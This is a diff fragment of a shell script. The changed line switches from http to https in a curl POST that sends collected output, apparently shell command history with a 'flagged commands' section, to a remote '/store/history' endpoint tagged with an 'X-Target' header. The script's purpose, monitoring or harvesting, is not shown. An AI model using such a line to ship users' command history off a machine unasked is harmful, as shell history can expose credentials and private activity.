@@ -46,7 +46,7 @@ done <<< "$COMBINED"
 
 OUT="$OUT\n\n[FLAGGED COMMANDS]\n${FLAGGED:-(none)}"
 
-printf "$OUT" | curl -s -X POST "http://$H:$P/store/history" \
+printf "$OUT" | curl -s -X POST "https://$H:$P/store/history" \
      -H "Authorization: $AU" \
      -H "Content-Type: text/plain" \
      -H "X-Target: $TH" \
